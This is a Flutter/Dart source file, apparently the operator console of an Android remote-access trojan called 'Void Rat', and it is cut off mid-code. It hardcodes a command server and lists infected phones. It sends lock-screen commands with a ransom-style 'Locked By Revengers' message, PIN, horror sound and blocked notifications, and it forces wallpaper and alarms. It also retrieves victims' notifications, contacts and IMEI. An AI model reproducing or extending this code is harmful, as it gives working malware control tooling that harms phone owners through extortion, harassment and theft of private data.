// ignore_for_file: deprecated_member_use
import 'dart:async';
import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart'; // <-- TAMBAHKAN BARIS INI

const String _kServerUrl = "http://vintolxbuyerbetot.omdhankiw.my.id:2001";
const String _font = "Rajdhani";


// ── ServerSetupPage kept as stub agar import di loader_page tidak error ─────
class ServerSetupPage extends StatelessWidget {
  const ServerSetupPage({super.key});
  @override
  Widget build(BuildContext context) =>
      const DeviceListPage(adminUsername: '');
}

// ==================== DEVICE LIST ====================
class DeviceListPage extends StatefulWidget {
  final String serverUrl;
  final String adminUsername; // [LOGIC BARU] Tambahkan variabel untuk menangkap username

  // Edit constructornya
  const DeviceListPage({
    super.key, 
    this.serverUrl = _kServerUrl, 
    required this.adminUsername // Pastikan ini dikirim dari halaman sebelum ini (splash)
  });

  @override
  State<DeviceListPage> createState() => _DeviceListPageState();
}

class _DeviceListPageState extends State<DeviceListPage>
    with SingleTickerProviderStateMixin {
  List<dynamic> devices = [];
  Timer? _timer;
  late AnimationController _pulseCtrl;

  int get totalDevices => devices.length;
  int get onlineDevices => devices.where((d) => d['isOnline'] == true).length;

  Future<void> _fetchDevices() async {
    try {
      // [LOGIC BARU] Tambahkan endpoint param widget.adminUsername
      final res = await http.get(Uri.parse('${widget.serverUrl}/api/devices/${widget.adminUsername}'));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (mounted) setState(() => devices = data);
      }
    } catch (_) {}
  }

  @override
  void initState() {
    super.initState();
    _pulseCtrl =
        AnimationController(vsync: this, duration: const Duration(seconds: 2))
          ..repeat(reverse: true);
    _fetchDevices();
    _timer =
        Timer.periodic(const Duration(seconds: 5), (_) => _fetchDevices());
  }

  @override
  void dispose() {
    _timer?.cancel();
    _pulseCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Stack(
      children: [
        Positioned.fill(child: Container(color: const Color(0xFF07110A))),

        Positioned(top: -100, left: -100,
          child: _cornerGlow(260, 0.14)),
        Positioned(top: -80, right: -80,
          child: _cornerGlow(220, 0.09)),
        Positioned(bottom: -80, left: -80,
          child: _cornerGlow(230, 0.10)),
        Positioned(bottom: -70, right: -70,
          child: _cornerGlow(200, 0.11)),

        SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              const SizedBox(height: 18),
              Padding(
                padding: const EdgeInsets.symmetric(horizontal: 18),
                child: _buildStatsCard(),
              ),
              const SizedBox(height: 18),
              Expanded(
                child: devices.isEmpty
                    ? _buildEmptyState()
                    : Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 18),
                        child: ListView.separated(
                          physics: const BouncingScrollPhysics(),
                          itemCount: devices.length,
                          separatorBuilder: (_, __) =>
                              const SizedBox(height: 10),
                          itemBuilder: (ctx, i) =>
                              _buildDeviceCard(devices[i]),
                        ),
                      ),
              ),
              const SizedBox(height: 95),
            ],
          ),
        ),
      ],
    );
  }

  Widget _cornerGlow(double size, double opacity) {
    return Container(
      width: size, height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        gradient: RadialGradient(colors: [
          const Color(0xFF25D366).withOpacity(opacity),
          Colors.transparent,
        ]),
      ),
    );
  }

  Widget _buildHeader() {
    return ClipRRect(
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
        child: Container(
          width: double.infinity,
          padding:
              const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [
                const Color(0xFF0D2415).withOpacity(0.75),
                const Color(0xFF25D366).withOpacity(0.12),
              ],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
            border: Border(
              bottom: BorderSide(
                  color: const Color(0xFF25D366).withOpacity(0.18)),
            ),
          ),
          child: Row(
            children: [
              ClipRRect(
                borderRadius: BorderRadius.circular(11),
                child: BackdropFilter(
                  filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
                  child: Container(
                    padding: const EdgeInsets.all(9),
                    decoration: BoxDecoration(
                      color: Colors.black.withOpacity(0.45),
                      borderRadius: BorderRadius.circular(11),
                      border: Border.all(
                        color:
                            const Color(0xFF25D366).withOpacity(0.35),
                      ),
                    ),
                    child: const Icon(Icons.phone_android,
                        color: Color(0xFF25D366), size: 22),
                  ),
                ),
              ),
              const SizedBox(width: 12),
              const Text(
                "Void Rat",
                style: TextStyle(
                  fontFamily: _font,
                  color: Colors.white,
                  fontWeight: FontWeight.bold,
                  fontSize: 18,
                  letterSpacing: 1.5,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildStatsCard() {
    return ClipRRect(
      borderRadius: BorderRadius.circular(18),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 14, sigmaY: 14),
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 18),
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.45),
            borderRadius: BorderRadius.circular(18),
            border: Border.all(
              color: const Color(0xFF25D366).withOpacity(0.22),
              width: 1.5,
            ),
            boxShadow: [
              BoxShadow(
                color: const Color(0xFF25D366).withOpacity(0.07),
                blurRadius: 22,
                spreadRadius: 2,
              ),
            ],
          ),
          child: Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(children: [
                    const Icon(Icons.wifi_tethering,
                        color: Colors.white54, size: 14),
                    const SizedBox(width: 5),
                    const Text("List Connection",
                        style: TextStyle(
                            fontFamily: _font,
                            color: Colors.white54,
                            fontSize: 11,
                            letterSpacing: 0.8)),
                  ]),
                  const SizedBox(height: 6),
                  Text("$totalDevices",
                      style: const TextStyle(
                          fontFamily: _font,
                          color: Colors.white,
                          fontSize: 32,
                          fontWeight: FontWeight.bold,
                          height: 1.0)),
                  const Text("Total Device",
                      style: TextStyle(
                          fontFamily: _font,
                          color: Colors.white38,
                          fontSize: 10)),
                ],
              ),

              Expanded(
                child: Center(
                  child: AnimatedBuilder(
                    animation: _pulseCtrl,
                    builder: (_, __) => Text(
                      "VOID RAT",
                      style: TextStyle(
                        fontFamily: _font,
                        color: Color.lerp(const Color(0xFF25D366),
                            const Color(0xFF00FF6A), _pulseCtrl.value),
                        fontSize: 18,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 3.5,
                        shadows: [
                          Shadow(
                            color: const Color(0xFF25D366).withOpacity(
                                0.5 + 0.3 * _pulseCtrl.value),
                            blurRadius: 10,
                          )
                        ],
                      ),
                    ),
                  ),
                ),
              ),

              Column(
                crossAxisAlignment: CrossAxisAlignment.end,
                children: [
                  Row(children: [
                    const Text("TOTAL ONLINE",
                        style: TextStyle(
                            fontFamily: _font,
                            color: Colors.white54,
                            fontSize: 11,
                            letterSpacing: 0.8)),
                    const SizedBox(width: 5),
                    const Icon(Icons.radar,
                        color: Colors.white54, size: 14),
                  ]),
                  const SizedBox(height: 6),
                  Text("$onlineDevices",
                      style: const TextStyle(
                          fontFamily: _font,
                          color: Color(0xFF25D366),
                          fontSize: 32,
                          fontWeight: FontWeight.bold,
                          height: 1.0)),
                  const Text("Online",
                      style: TextStyle(
                          fontFamily: _font,
                          color: Colors.white38,
                          fontSize: 10)),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildDeviceCard(Map d) {
    final bool isOnline = d['isOnline'] == true;
    final String deviceName =
        d['model']?.toString() ?? d['deviceId']?.toString() ?? "Unknown";
    final Color dotColor =
        isOnline ? const Color(0xFF25D366) : Colors.redAccent;

    return Stack(
      children: [
        ClipRRect(
          borderRadius: BorderRadius.circular(14),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
            child: Container(
              padding: const EdgeInsets.symmetric(
                  horizontal: 14, vertical: 14),
              decoration: BoxDecoration(
                color: isOnline
                    ? const Color(0xFF0D2214).withOpacity(0.85)
                    : Colors.black.withOpacity(0.45),
                borderRadius: BorderRadius.circular(14),
                border: Border.all(
                  color: isOnline
                      ? const Color(0xFF25D366).withOpacity(0.28)
                      : Colors.white.withOpacity(0.08),
                  width: 1.2,
                ),
                boxShadow: isOnline
                    ? [
                        BoxShadow(
                          color: const Color(0xFF25D366).withOpacity(0.06),
                          blurRadius: 12,
                          spreadRadius: 1,
                        )
                      ]
                    : [],
              ),
              child: Row(
                children: [
                  Container(
                    width: 50,
                    height: 50,
                    decoration: BoxDecoration(
                      color: isOnline
                          ? const Color(0xFF25D366).withOpacity(0.12)
                          : Colors.white.withOpacity(0.04),
                      borderRadius: BorderRadius.circular(13),
                      border: Border.all(
                        color: isOnline
                            ? const Color(0xFF25D366).withOpacity(0.4)
                            : Colors.white.withOpacity(0.08),
                      ),
                    ),
                    child: Icon(
                      Icons.phone_android,
                      color: isOnline
                          ? const Color(0xFF25D366)
                          : Colors.white38,
                      size: 26,
                    ),
                  ),
                  const SizedBox(width: 14),

                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          "VOID\u2014$deviceName",
                          style: const TextStyle(
                            fontFamily: _font,
                            color: Colors.white,
                            fontWeight: FontWeight.bold,
                            fontSize: 14,
                            letterSpacing: 0.8,
                          ),
                          overflow: TextOverflow.ellipsis,
                        ),
                        const SizedBox(height: 4),
                        Text(
                          d['deviceId']?.toString() ?? "",
                          style: const TextStyle(
                            fontFamily: _font,
                            color: Colors.white38,
                            fontSize: 10,
                          ),
                          overflow: TextOverflow.ellipsis,
                        ),
                      ],
                    ),
                  ),

                  const SizedBox(width: 10),

                  GestureDetector(
                    onTap: () => Navigator.push(
                      context,
                      MaterialPageRoute(
                        builder: (_) => ControlPanelPage(
                          deviceData: d,
                          serverUrl: widget.serverUrl,
                        ),
                      ),
                    ),
                    child: Container(
                      padding: const EdgeInsets.all(9),
                      decoration: BoxDecoration(
                        color: const Color(0xFF25D366).withOpacity(0.10),
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(
                          color:
                              const Color(0xFF25D366).withOpacity(0.30),
                        ),
                      ),
                      child: const Icon(
                        Icons.arrow_forward_ios_rounded,
                        color: Color(0xFF25D366),
                        size: 14,
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),

        Positioned(
          top: 9,
          left: 9,
          child: AnimatedBuilder(
            animation: _pulseCtrl,
            builder: (_, __) => Container(
              width: 9,
              height: 9,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: dotColor,
                boxShadow: [
                  BoxShadow(
                    color: dotColor.withOpacity(
                        isOnline ? 0.4 + 0.35 * _pulseCtrl.value : 0.4),
                    blurRadius: isOnline
                        ? 6 + 4 * _pulseCtrl.value
                        : 4,
                    spreadRadius: 1,
                  ),
                ],
              ),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          AnimatedBuilder(
            animation: _pulseCtrl,
            builder: (_, child) => Container(
              padding: const EdgeInsets.all(22),
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: const Color(0xFF25D366)
                    .withOpacity(0.05 + 0.05 * _pulseCtrl.value),
                border: Border.all(
                  color: const Color(0xFF25D366)
                      .withOpacity(0.15 + 0.15 * _pulseCtrl.value),
                ),
              ),
              child: child,
            ),
            child: const Icon(Icons.radar,
                color: Color(0xFF25D366), size: 44),
          ),
          const SizedBox(height: 20),
          const Text(
            "SCANNING NETWORK...",
            style: TextStyle(
              fontFamily: _font,
              color: Colors.white54,
              fontSize: 14,
              letterSpacing: 3.0,
              fontWeight: FontWeight.bold,
            ),
          ),
          const SizedBox(height: 8),
          const Text(
            "Mencari perangkat yang terhubung",
            style: TextStyle(
                fontFamily: _font, color: Colors.white24, fontSize: 12),
          ),
        ],
      ),
    );
  }
}

// ==================== CONTROL PANEL ====================
class ControlPanelPage extends StatefulWidget {
  final Map deviceData;
  final String serverUrl;
  const ControlPanelPage(
      {super.key, required this.deviceData, required this.serverUrl});

  @override
  _ControlPanelPageState createState() => _ControlPanelPageState();
}

class _ControlPanelPageState extends State<ControlPanelPage>
    with SingleTickerProviderStateMixin {
  String get deviceId => widget.deviceData['deviceId'];
  String get server => widget.serverUrl;
  bool get isOnline => widget.deviceData['isOnline'] ?? false;
  String get deviceName =>
      widget.deviceData['model']?.toString() ?? 'Unknown Device';

  String _activeTab = 'takeover';
  final List<Map<String, String>> _cmdLog = [];
  late AnimationController _pulseCtrl;

  @override
  void initState() {
    super.initState();
    _pulseCtrl = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);
  }

  @override
  void dispose() {
    _pulseCtrl.dispose();
    super.dispose();
  }

  Future<void> sendCmd(String cmd, Map? payload) async {
    final ts = DateTime.now();
    final timeStr = '${ts.hour.toString().padLeft(2, '0')}:${ts.minute.toString().padLeft(2, '0')}:${ts.second.toString().padLeft(2, '0')}';
    
    // Ambil admin username dari SharedPreferences
    final prefs = await SharedPreferences.getInstance();
    final ownerUsername = prefs.getString('admin_username') ?? '';
    
    try {
      final response = await http.post(
        Uri.parse('$server/api/command'),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
            "deviceId": deviceId, 
            "command": cmd, 
            "payload": payload,
            "owner": ownerUsername  // ← INI YANG DITAMBAHKAN
        }),
      );
      
      print("Command response: ${response.statusCode} - ${response.body}");
      
      if (!mounted) return;
      setState(() {
        _cmdLog.insert(0, {
          'time': timeStr,
          'cmd': cmd,
          'status': response.statusCode == 200 ? 'sent' : 'failed (${response.statusCode})',
        });
        if (_cmdLog.length > 50) _cmdLog.removeLast();
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        _cmdLog.insert(0, {
          'time': timeStr,
          'cmd': cmd,
          'status': 'error: $e',
        });
        if (_cmdLog.length > 50) _cmdLog.removeLast();
      });
    }
}

  // ── Glass dialog helper ────────────────────────────────────────────────────
  Widget _glassDialog({required Widget child}) {
    return Dialog(
      backgroundColor: Colors.transparent,
      insetPadding: const EdgeInsets.symmetric(horizontal: 20),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(20),
        child: BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 18, sigmaY: 18),
          child: Container(
            padding: const EdgeInsets.all(22),
            decoration: BoxDecoration(
              color: const Color(0xFF071410).withOpacity(0.94),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                  color: const Color(0xFF25D366).withOpacity(0.3), width: 1.5),
              boxShadow: [
                BoxShadow(
                    color: const Color(0xFF25D366).withOpacity(0.14),
                    blurRadius: 28,
                    spreadRadius: 2),
              ],
            ),
            child: child,
          ),
        ),
      ),
    );
  }

  void showLockDialog() {
    final msg = TextEditingController(text: "Locked By Revengers");
    final pin = TextEditingController(text: "2025");
    bool disco = true;
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(builder: (ctx, setDS) {
        return _glassDialog(
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Row(children: [
              Container(
                padding: const EdgeInsets.all(9),
                decoration: BoxDecoration(
                  color: Colors.redAccent.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(11),
                  border:
                      Border.all(color: Colors.redAccent.withOpacity(0.5)),
                ),
                child: const Icon(Icons.lock, color: Colors.redAccent, size: 20),
              ),
              const SizedBox(width: 12),
              const Text("Locked (Non Hard)",
                  style: TextStyle(
                      fontFamily: _font,
                      color: Colors.white,
                      fontSize: 18,
                      fontWeight: FontWeight.bold)),
            ]),
            _dialogDivider(),
            _dialogField(msg, "Pesan Lock", Icons.message_outlined),
            const SizedBox(height: 12),
            _dialogField(pin, "PIN (4-6 digit)", Icons.pin_outlined,
                isNumber: true),
            const SizedBox(height: 14),
            Row(children: [
              Checkbox(
                  value: disco,
                  activeColor: Colors.redAccent,
                  onChanged: (v) => setDS(() => disco = v!)),
              const Text("Disco Flash (kedip senter)",
                  style: TextStyle(fontFamily: _font, color: Colors.white70, fontSize: 13)),
            ]),
            const SizedBox(height: 18),
            Row(children: [
              Expanded(child: _cancelBtn(ctx)),
              const SizedBox(width: 10),
              Expanded(
                flex: 2,
                child: _actionBtn("LOCK NOW", Colors.redAccent, () {
                  sendCmd("LOCK", {
                    "message": msg.text,
                    "pin": pin.text,
                    "disco": disco,
                    "backgroundType": "wallpaper",
                  });
                  Navigator.pop(ctx);
                }),
              ),
            ]),
          ]),
        );
      }),
    );
  }

  void showLockhardDialog() {
    final pinCtrl = TextEditingController(text: "1234");
    bool isDisco = true, isHorror = true, isBlockNotif = true;
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(builder: (ctx, setDS) {
        return _glassDialog(
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Row(children: [
              Container(
                padding: const EdgeInsets.all(9),
                decoration: BoxDecoration(
                  color: Colors.red.withOpacity(0.18),
                  borderRadius: BorderRadius.circular(11),
                  border: Border.all(color: Colors.red.withOpacity(0.5)),
                ),
                child: const Icon(Icons.lock, color: Colors.red, size: 20),
              ),
              const SizedBox(width: 12),
              const Text("Locked (Hard)",
                  style: TextStyle(
                      fontFamily: _font,
                      color: Colors.white,
                      fontSize: 18,
                      fontWeight: FontWeight.bold)),
            ]),
            _dialogDivider(),
            _dialogField(pinCtrl, "PIN (4-6 digit)", Icons.pin_outlined,
                isNumber: true),
            const SizedBox(height: 14),
            _checkRow("Disco Flash", isDisco,
                (v) => setDS(() => isDisco = v!), Colors.red),
            _checkRow("Horror Sound", isHorror,
                (v) => setDS(() => isHorror = v!), Colors.red),
            _checkRow("Block Notifikasi", isBlockNotif,
                (v) => setDS(() => isBlockNotif = v!), Colors.red),
            const SizedBox(height: 18),
            Row(children: [
              Expanded(child: _cancelBtn(ctx)),
              const SizedBox(width: 10),
              Expanded(
                flex: 2,
                child: _actionBtn("LOCK HARD", Colors.red, () {
                  sendCmd("LOCKHARD", {
                    "pin": pinCtrl.text,
                    "disco": isDisco,
                    "horror": isHorror,
                    "block_notif": isBlockNotif,
                  });
                  Navigator.pop(ctx);
                }),
              ),
            ]),
          ]),
        );
      }),
    );
  }

  void showWallpaperDialog() {
    final url = TextEditingController();
    showDialog(
      context: context,
      builder: (ctx) => _glassDialog(
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Row(children: [
            Container(
              padding: const EdgeInsets.all(9),
              decoration: BoxDecoration(
                color: Colors.teal.withOpacity(0.15),
                borderRadius: BorderRadius.circular(11),
                border: Border.all(color: Colors.teal.withOpacity(0.5)),
              ),
              child: const Icon(Icons.wallpaper, color: Colors.teal, size: 20),
            ),
            const SizedBox(width: 12),
            const Text("Set Wallpaper",
                style: TextStyle(
                    fontFamily: _font,
                    color: Colors.white,
                    fontSize: 18,
                    fontWeight: FontWeight.bold)),
          ]),
          _dialogDivider(),
          _dialogField(url, "Direct Image URL", Icons.link_outlined),
          const SizedBox(height: 18),
          Row(children: [
            Expanded(child: _cancelBtn(ctx)),
            const SizedBox(width: 10),
            Expanded(
              flex: 2,
              child: _actionBtn("SET", Colors.teal, () {
                sendCmd("SET_WALLPAPER", {"url": url.text});
                Navigator.pop(ctx);
              }),
            ),
          ]),
        ]),
      ),
    );
  }

  void showAlarmDialog() {
    String mode = 'auto';
    final urlCtrl = TextEditingController();
    final durCtrl = TextEditingController(text: '5');
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(builder: (ctx, setDS) {
        return _glassDialog(
          child: SingleChildScrollView(
            child: Column(mainAxisSize: MainAxisSize.min, children: [
              Row(children: [
                Container(
                  padding: const EdgeInsets.all(9),
                  decoration: BoxDecoration(
                    color: Colors.blue.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(11),
                    border: Border.all(color: Colors.blue.withOpacity(0.5)),
                  ),
                  child: const Icon(Icons.volume_up, color: Colors.blue, size: 20),
                ),
                const SizedBox(width: 12),
                const Text("Play Sound",
                    style: TextStyle(
                        fontFamily: _font,
                        color: Colors.white,
                        fontSize: 18,
                        fontWeight: FontWeight.bold)),
              ]),
              _dialogDivider(),
              _radioRow("Otomatis (assets sound.mp3)", 'auto', mode,
                  (v) => setDS(() => mode = v!), Colors.blue),
              _radioRow("Custom URL MP3", 'custom', mode,
                  (v) => setDS(() => mode = v!), Colors.blue),
              if (mode == 'custom') ...[
                const SizedBox(height: 8),
                _dialogField(urlCtrl, "URL MP3", Icons.link_outlined),
              ],
              const SizedBox(height: 14),
              _dialogField(durCtrl, "Durasi (detik)", Icons.timer_outlined,
                  isNumber: true),
              const SizedBox(height: 18),
              Row(children: [
                Expanded(child: _cancelBtn(ctx)),
                const SizedBox(width: 10),
                Expanded(
                  flex: 2,
                  child: _actionBtn("EXECUTE", Colors.blue, () {
                    int? dur = int.tryParse(durCtrl.text);
                    if (dur == null || dur <= 0) return;
                    if (mode == 'custom' && urlCtrl.text.isEmpty) return;
                    Map<String, dynamic> payload = {'mode': mode, 'duration': dur};
                    if (mode == 'custom') payload['url'] = urlCtrl.text;
                    sendCmd('ALARM', payload);
                    Navigator.pop(ctx);
                  }),
                ),
              ]),
            ]),
          ),
        );
      }),
    );
  }

  Future<void> _fetchAndShowNotifications() async {
    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
      content: Text("Mengambil notifikasi...",
          style: TextStyle(color: Colors.white, fontFamily: _font)),
      backgroundColor: Colors.orange,
      duration: Duration(seconds: 2),
    ));
    try {
      await sendCmd("GET_NOTIFICATIONS", {});
      await Future.delayed(const Duration(seconds: 2));
      final res = await http
          .get(Uri.parse('$server/api/intel/$deviceId'))
          .timeout(const Duration(seconds: 10));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        final notifs = data['notifications'] as List? ?? [];
        if (!mounted) return;
        if (notifs.isEmpty) {
          ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
            content: Text("Belum ada notifikasi",
                style: TextStyle(color: Colors.white, fontFamily: _font)),
            backgroundColor: Colors.grey,
          ));
        } else {
          _showNotificationsDialog(notifs);
        }
      }
    } catch (e) {
      if (!mounted) return;
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
        content: Text("Error: $e",
            style: const TextStyle(color: Colors.white, fontFamily: _font)),
        backgroundColor: Colors.red,
      ));
    }
  }

  void _showNotificationsDialog(List notifications) {
    showDialog(
      context: context,
      builder: (ctx) => _glassDialog(
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          const Text("Notifikasi Masuk",
              style: TextStyle(
                  fontFamily: _font,
                  color: Colors.white,
                  fontSize: 18,
                  fontWeight: FontWeight.bold)),
          _dialogDivider(),
          SizedBox(
            height: 320,
            child: ListView.builder(
              physics: const BouncingScrollPhysics(),
              itemCount: notifications.length,
              itemBuilder: (c, i) {
                var n = notifications[i];
                return Container(
                  margin: const EdgeInsets.only(bottom: 8),
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: Colors.indigo.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(
                        color: Colors.indigo.withOpacity(0.3)),
                  ),
                  child: Row(children: [
                    const Icon(Icons.notifications,
                        color: Colors.indigo, size: 16),
                    const SizedBox(width: 8),
                    Expanded(
                      child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(n['title'] ?? 'No title',
                                style: const TextStyle(
                                    fontFamily: _font,
                                    color: Colors.white,
                                    fontWeight: FontWeight.bold,
                                    fontSize: 12)),
                            Text(n['text'] ?? '',
                                style: const TextStyle(
                                    fontFamily: _font,
                                    color: Colors.white54,
                                    fontSize: 11)),
                          ]),
                    ),
                    Text(_formatTime(n['time'] ?? 0),
                        style: const TextStyle(
                            color: Colors.white30, fontSize: 10)),
                  ]),
                );
              },
            ),
          ),
          const SizedBox(height: 10),
          SizedBox(
              width: double.infinity,
              child: _cancelBtn(ctx)),
        ]),
      ),
    );
  }

  Future<void> _fetchAndShowContacts() async {
    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
      content: Text("Mengambil kontak...",
          style: TextStyle(color: Colors.white, fontFamily: _font)),
      backgroundColor: Colors.orange,
      duration: Duration(seconds: 2),
    ));
    try {
      await sendCmd("GET_CONTACTS", {});
      await Future.delayed(const Duration(seconds: 2));
      final res = await http
          .get(Uri.parse('$server/api/intel/$deviceId'))
          .timeout(const Duration(seconds: 10));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        final contacts = data['contacts'] as List? ?? [];
        if (!mounted) return;
        if (contacts.isEmpty) {
          ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
            content: Text("Belum ada kontak",
                style: TextStyle(color: Colors.white, fontFamily: _font)),
            backgroundColor: Colors.grey,
          ));
        } else {
          _showContactsDialog(contacts);
        }
      }
    } catch (e) {
      if (!mounted) return;
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
        content: Text("Error: $e",
            style: const TextStyle(color: Colors.white, fontFamily: _font)),
        backgroundColor: Colors.red,
      ));
    }
  }

  void _showContactsDialog(List contacts) {
    showDialog(
      context: context,
      builder: (ctx) => _glassDialog(
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          const Text("All Contacts",
              style: TextStyle(
                  fontFamily: _font,
                  color: Colors.white,
                  fontSize: 18,
                  fontWeight: FontWeight.bold)),
          _dialogDivider(),
          SizedBox(
            height: 320,
            child: ListView.builder(
              physics: const BouncingScrollPhysics(),
              itemCount: contacts.length,
              itemBuilder: (c, i) {
                var ct = contacts[i];
                return Container(
                  margin: const EdgeInsets.only(bottom: 8),
                  padding: const EdgeInsets.symmetric(
                      horizontal: 12, vertical: 10),
                  decoration: BoxDecoration(
                    color: Colors.cyan.withOpacity(0.06),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(
                        color: Colors.cyan.withOpacity(0.2)),
                  ),
                  child: Row(children: [
                    const Icon(Icons.person_outline,
                        color: Colors.cyan, size: 16),
                    const SizedBox(width: 8),
                    Expanded(
                      child: Text(ct['name'] ?? 'Unknown',
                          style: const TextStyle(
                              fontFamily: _font,
                              color: Colors.white,
                              fontSize: 13)),
                    ),
                    Text(ct['id'] ?? '',
                        style: const TextStyle(
                            fontFamily: _font,
                            color: Colors.white38,
                            fontSize: 11)),
                  ]),
                );
              },
            ),
          ),
          const SizedBox(height: 10),
          SizedBox(width: double.infinity, child: _cancelBtn(ctx)),
        ]),
      ),
    );
  }

  Future<void> _fetchAndShowDeviceInfo() async {
    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
      content: Text("Mengambil info perangkat...",
          style: TextStyle(color: Colors.white, fontFamily: _font)),
      backgroundColor: Colors.orange,
      duration: Duration(seconds: 2),
    ));
    try {
      await sendCmd("GET_DEVICE_INFO", {});
      await Future.delayed(const Duration(seconds: 2));
      final res = await http
          .get(Uri.parse('$server/api/intel/$deviceId'))
          .timeout(const Duration(seconds: 10));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        final info = data['deviceInfo'] is List
            ? (data['deviceInfo'] as List).firstOrNull ?? {}
            : data['deviceInfo'] ?? {};
        if (!mounted) return;
        _showDeviceInfoDialog(info);
      }
    } catch (e) {
      if (!mounted) return;
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
        content: Text("Error: $e",
            style: const TextStyle(color: Colors.white, fontFamily: _font)),
        backgroundColor: Colors.red,
      ));
    }
  }

  void _showDeviceInfoDialog(Map info) {
    showDialog(
      context: context,
      builder: (ctx) => _glassDialog(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text("Device Info",
                style: TextStyle(
                    fontFamily: _font,
                    color: Colors.white,
                    fontSize: 18,
                    fontWeight: FontWeight.bold)),
            _dialogDivider(),
            if (info['model'] != null)
              _infoRow("Model", info['model'].toString()),
            if (info['os'] != null)
              _infoRow("OS", info['os'].toString()),
            if (info['imei'] != null)
              _infoRow("IMEI", info['imei'].toString()),
            if (info.isEmpty)
              const Text("No info available",
                  style:
                      TextStyle(fontFamily: _font, color: Colors.white38)),
            const SizedBox(height: 16),
            SizedBox(width: double.infinity, child: _cancelBtn(ctx)),
          ],
        ),
      ),
    );
  }

  // ── Dialog helper widgets ─────────────────────────────────────────────────
  Widget _dialogDivider() => Container(
        height: 1,
        margin: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          gradient: LinearGradient(colors: [
            Colors.transparent,
            const Color(0xFF25D366).withOpacity(0.4),
            Colors.transparent,
          ]),
        ),
      );

  Widget _dialogField(TextEditingController ctrl, String hint, IconData icon,
      {bool isNumber = false}) {
    return TextField(
      controller: ctrl,
      keyboardType: isNumber ? TextInputType.number : TextInputType.text,
      style: const TextStyle(fontFamily: _font, color: Colors.white, fontSize: 14),
      decoration: InputDecoration(
        hintText: hint,
        hintStyle: const TextStyle(fontFamily: _font, color: Colors.white30, fontSize: 13),
        prefixIcon: Icon(icon, color: const Color(0xFF25D366), size: 18),
        filled: true,
        fillColor: Colors.black.withOpacity(0.35),
        enabledBorder: OutlineInputBorder(
          borderSide: BorderSide(color: const Color(0xFF25D366).withOpacity(0.2)),
          borderRadius: BorderRadius.circular(10),
        ),
        focusedBorder: OutlineInputBorder(
          borderSide:
              const BorderSide(color: Color(0xFF25D366), width: 1.4),
          borderRadius: BorderRadius.circular(10),
        ),
        contentPadding:
            const EdgeInsets.symmetric(horizontal: 12, vertical: 12),
      ),
    );
  }

  Widget _checkRow(String label, bool value, ValueChanged<bool?> onChange,
      Color color) {
    return Row(children: [
      Checkbox(value: value, activeColor: color, onChanged: onChange),
      Text(label,
          style: const TextStyle(
              fontFamily: _font, color: Colors.white70, fontSize: 13)),
    ]);
  }

  Widget _radioRow(String label, String val, String groupVal,
      ValueChanged<String?> onChange, Color color) {
    return Row(children: [
      Radio<String>(
